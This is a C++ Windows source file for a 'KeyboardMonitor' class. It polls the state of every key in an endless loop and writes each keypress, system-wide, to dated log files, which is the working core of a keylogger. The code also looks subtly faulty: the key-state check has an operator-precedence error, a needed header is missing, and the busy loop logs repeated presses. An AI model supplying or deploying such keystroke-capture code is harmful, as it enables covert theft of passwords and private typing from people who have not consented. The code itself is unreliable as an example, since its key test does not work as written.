#include <fstream>
#include <iostream>
#include <windows.h>
#include <winuser.h>

#include "KeyboardMonitor.h"

KeyboardEvent::KeyboardEvent(short virtualKeyCode):
	BaseEvent(),
	m_virtualKeyCode(virtualKeyCode)
{
	m_type = EVENT_KEYBOARD;
}

KeyboardMonitor::KeyboardMonitor(void):
	m_maxListSize(DEFAULT_MAX_LIST_SIZE),
	m_writeToLog(false),
	m_logFilePath()
{
}

KeyboardMonitor::KeyboardMonitor(std::string logFilePath):
	m_maxListSize(DEFAULT_MAX_LIST_SIZE),
	m_writeToLog(true),
	m_logFilePath(logFilePath)
{
}

KeyboardMonitor::KeyboardMonitor(std::string logFilePath, unsigned int maxListSize):
	m_maxListSize(maxListSize),
	m_writeToLog(true),
	m_logFilePath(logFilePath)
{
}

KeyboardMonitor::~KeyboardMonitor(void)
{
}

void KeyboardMonitor::StartMonitor(void)
{
	int count = 0;

	while(true)
	{
		for (int virtualKeyCode = 0x01; virtualKeyCode <= 0xFE; ++virtualKeyCode)
		{
			short result = GetAsyncKeyState(virtualKeyCode);

			if (result & KEY_CURRENTLY_PRESSED_MASK > 0)
			{
				m_keyboardEventList.emplace_back(KeyboardEvent(virtualKeyCode));

				std::cout << m_keyboardEventList.back().toString() << std::endl;
				
				// Write to log every 100 event
				if (m_writeToLog && m_keyboardEventList.size() > m_maxListSize)
				{
					(void)appendToFile();
					std::cout << "Write to log" << std::endl;
				}
			}
		}
	}
}

bool KeyboardMonitor::appendToFile(void)
{
	if (!m_writeToLog || m_logFilePath.empty())
	{
		return false;
	}

	if (m_keyboardEventList.empty())
	{
		return true;
	}

	SYSTEMTIME localTime = m_keyboardEventList.front().getLocalTime();

	std::ostringstream logFilePath;
	logFilePath << m_logFilePath << "_" << localTime.wYear << "_" << localTime.wMonth << "_" << localTime.wDay << ".log";

	std::ofstream outfile;
	outfile.open(logFilePath.str(), std::ios_base::app);
	
	auto iter = m_keyboardEventList.begin();
	while (!m_keyboardEventList.empty())
	{
		outfile << iter->toString() << "\n";
		iter = m_keyboardEventList.erase(iter);
	}

	outfile.close();

	return true;
}